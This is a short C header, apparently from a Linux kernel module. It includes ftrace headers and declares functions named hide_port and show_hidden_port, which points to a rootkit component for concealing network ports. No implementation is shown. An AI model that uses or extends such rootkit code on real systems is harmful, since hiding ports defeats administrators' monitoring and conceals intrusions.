#ifndef HIDEPORT_H
#define HIDEPORT_H

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

void hide_port(char *);
void show_hidden_port(char *);
//void showme(char *);

#endif
